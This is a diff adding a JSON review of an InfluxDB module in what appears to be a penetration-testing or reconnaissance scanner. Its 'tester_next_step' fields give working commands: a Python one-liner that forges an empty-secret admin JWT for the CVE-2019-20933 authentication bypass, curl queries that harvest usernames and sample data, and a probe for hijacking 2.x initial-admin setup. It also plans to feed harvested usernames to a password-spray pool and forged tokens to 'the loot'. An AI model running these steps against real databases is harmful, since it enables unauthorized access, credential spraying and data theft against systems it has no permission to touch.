@@ -1,0 +1,52 @@
+{
+  "service": "influxdb",
+  "summary": "Small module but the essentials fire: X-Influxdb-Version fingerprint via /ping and a real SHOW DATABASES query against /query for the unauth discriminator, with a version-gated CVE-2019-20933 flag. Gaps: no SHOW USERS harvest on unauth, no 2.x /api/v2/setup onboarding-bypass probe (a well-known 2.x class of finding), and CVE-2019-20933 is version-only - no actual empty-secret JWT forge+replay verify.",
+  "module_files": [
+    "recce/services/db/influxdb.py"
+  ],
+  "findings": [
+    {
+      "kind": "influxdb_unauth",
+      "title_pattern": "InfluxDB exposed - unauthenticated query API",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "GET /query?q=SHOW DATABASES returns 200 with results and parsed DB names - proof of read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-follow with SHOW USERS (surfaces usernames and admin bool), SHOW RETENTION POLICIES per db, and SELECT * FROM <db>..<m> LIMIT 20 for sample time-series values (hostnames/tokens). Publish captured usernames to the shared spray pool.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -s -G 'http://<ip>:<port>/query' --data-urlencode 'q=SHOW USERS' ; --data-urlencode 'q=SELECT * FROM <db>..<measurement> LIMIT 20' ; harvest hostnames + admin usernames.",
+      "related_cves": []
+    },
+    {
+      "kind": "influxdb_jwt_bypass",
+      "title_pattern": "InfluxDB < 1.7.6 - JWT auth bypass (CVE-2019-20933)",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Version compared to 1.7.6; the exploit path is not actually forged/replayed - purely a version-based flag.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Forge an HS256 JWT with an empty secret ({\"username\":\"admin\",\"exp\":<future>}) and hit /query?q=SHOW DATABASES with Authorization: Bearer <jwt>; a 200 confirms the bypass (stdlib-only via hmac+base64url).",
+      "promotion_risk": "low",
+      "tester_next_step": "python3 -c 'import hmac,hashlib,base64,json,time; h=base64.urlsafe_b64encode(b\\\"{\\\\\\\"alg\\\\\\\":\\\\\\\"HS256\\\\\\\",\\\\\\\"typ\\\\\\\":\\\\\\\"JWT\\\\\\\"}\\\").rstrip(b\\\"=\\\"); p=base64.urlsafe_b64encode(json.dumps({\\\"username\\\":\\\"admin\\\",\\\"exp\\\":int(time.time())+3600}).encode()).rstrip(b\\\"=\\\"); s=base64.urlsafe_b64encode(hmac.new(b\\\"\\\",h+b\\\".\\\"+p,hashlib.sha256).digest()).rstrip(b\\\"=\\\"); print((h+b\\\".\\\"+p+b\\\".\\\"+s).decode())' ; curl -H 'Authorization: Bearer <jwt>' 'http://<ip>:<port>/query?q=SHOW+DATABASES'",
+      "related_cves": [
+        "CVE-2019-20933"
+      ]
+    },
+    {
+      "kind": "influxdb_version",
+      "title_pattern": "InfluxDB legacy build",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Version-only advisory bucket (defined in _NARRATIVE) - fingerprint tier.",
+      "can_promote_to": "t1",
+      "promotion_notes": "2.x has a well-known /api/v2/setup 'allowed:true' unauth-onboarding class - add a GET /api/v2/setup probe that reads {allowed:true} as a T1 verify.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -s http://<ip>:<port>/api/v2/setup - {\"allowed\":true} means the initial-admin creation endpoint is open (T1 verify of 2.x hijack primitive).",
+      "related_cves": []
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users (SHOW USERS -> spray)",
+    "hostname_pool (time-series often carries hostname tags)",
+    "credentials.jwt (once JWT forge lands, publish forged admin bearer to the loot)"
+  ]
+}
